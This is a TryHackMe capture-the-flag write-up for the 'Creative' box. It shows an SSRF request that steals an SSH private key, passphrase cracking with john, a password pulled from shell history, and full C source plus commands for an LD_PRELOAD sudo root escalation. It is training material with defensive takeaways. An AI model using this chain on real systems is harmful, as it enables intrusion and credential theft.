# 🎨 Creative: Easy

### TryHackMe Writeup

[![Platform](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme)](https://tryhackme.com)
[![Difficulty](https://img.shields.io/badge/Difficulty-Easy-brightgreen?style=for-the-badge)](https://tryhackme.com)
[![Status](https://img.shields.io/badge/Status-Pwned-blueviolet?style=for-the-badge)](https://tryhackme.com)
[![Type](https://img.shields.io/badge/Type-Linux-informational?style=for-the-badge&logo=linux)](https://tryhackme.com)

---

## 📋 Overview

| Field | Details |
|---|---|
| **Target** | `creative.thm` |
| **OS** | Ubuntu 20.04 |
| **Attack Surface** | SSRF on `beta.creative.thm` → internal port scan → SSH private key exfil |
| **Privesc** | Plaintext password in `.bash_history` → `sudo ping` with `env_keep+=LD_PRELOAD` → root |

Creative chains subdomain enumeration into an SSRF-capable URL fetcher on `beta.creative.thm`. Internal port probing via the SSRF finds an SSH key exposed on port 1337. The private key is passphrase-protected — cracked via `ssh2john` + `john`. Post-login, the user's plaintext password leaks from `.bash_history`. That password allows `sudo ping`, and the sudoers config preserves `LD_PRELOAD`, enabling a shared library injection to drop a root shell.

---

## 🔍 Enumeration

### Port Scan

```bash
sudo nmap -sC -sV -p- -vv -T4 creative.thm -oA creative-tcp-scan
```

```
22/tcp open  ssh    OpenSSH 8.2p1
80/tcp open  http   nginx
```

### Subdomain Enumeration

```bash
ffuf -w ./subdomains-top1million-5000.txt \
  -u http://creative.thm/ -H "Host:FUZZ.creative.thm" \
  -fw 6 -o subdomain-ffuf.out
```

```
beta    [Status: 200, Size: 591]
```

`beta.creative.thm` hosts a URL fetcher — submits a URL and the server fetches it server-side. Classic SSRF surface.

### SSRF — Internal Port Discovery

Probed `127.0.0.1` across all ports via the URL fetcher. Two ports responded:

```
port 80   — open (the main web app)
port 1337 — open (internal-only service)
```

### SSRF — SSH Key Exfiltration

The internal port 1337 serves a directory listing of the `saad` user's home directory. The SSH private key is directly accessible:

```
POST / HTTP/1.1
Host: beta.creative.thm

url=http%3A%2F%2Flocalhost%3A1337%2Fhome%2Fsaad/.ssh/id_rsa
```

Response returns the full RSA private key.

---

## 💀 Initial Access — SSH with Cracked Private Key

The private key is passphrase-protected:

```bash
ssh -i priv.key saad@creative.thm
# Enter passphrase for key 'priv.key':
```

### Crack the Passphrase

```bash
ssh2john priv.key > ssh_hash.txt
john ssh_hash.txt --wordlist=./xato-net-10-million-passwords-10000.txt
# sweetness    (priv.key)
```

```bash
ssh -i priv.key saad@creative.thm
# passphrase: sweetness
```

```
saad@m4lware:~$
```

---

## 🔁 Privilege Escalation — saad → root

### Plaintext Password in .bash_history

```bash
cat .bash_history
```

```
echo "saad:MyStrongestPasswordYet$4291" > creds.txt
rm creds.txt
```

Password: `MyStrongestPasswordYet$4291`

### sudo + LD_PRELOAD

```bash
sudo -l
```

```
env_keep+=LD_PRELOAD
(root) /usr/bin/ping
```

The sudoers config keeps `LD_PRELOAD` from the caller's environment — a well-known privesc vector. Compiled a shared library that spawns `/bin/bash` in its `_init()` constructor, then loaded it via `LD_PRELOAD` before the sudo ping call:

```c
// root.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setuid(0);
    setgid(0);
    system("/bin/bash");
}
```

```bash
gcc -fPIC -shared -o root.so root.c -nostartfiles
sudo LD_PRELOAD=$PWD/root.so /usr/bin/ping 127.0.0.1
```

```
root@m4lware:/home/saad#
```

---

## 🗺️ Attack Chain

```
[Subdomain Enum]
    beta.creative.thm — URL fetcher (SSRF)
          │
          ▼
[SSRF — Internal Port Scan]
    127.0.0.1:1337 open → home directory listing
          │
          ▼
[SSRF — Key Exfil]
    /home/saad/.ssh/id_rsa → passphrase cracked (sweetness)
    SSH as saad
          │
          ▼
[.bash_history]
    saad:MyStrongestPasswordYet$4291
          │
          ▼
[sudo LD_PRELOAD]
    env_keep+=LD_PRELOAD + sudo ping → shared lib injection → root
```

---

## 📌 Key Takeaways

- SSRF in URL fetchers should be restricted to external hosts only; internal `127.0.0.1` and RFC-1918 ranges must be blocked
- Serving a home directory over an unauthenticated internal HTTP port is equivalent to leaving SSH keys in a public web root
- `env_keep+=LD_PRELOAD` in sudoers is a critical misconfiguration — sudo should strip dangerous environment variables, not preserve them
- Shell history files regularly contain plaintext credentials; always check `.bash_history`, `.zsh_history`, and similar during post-exploitation
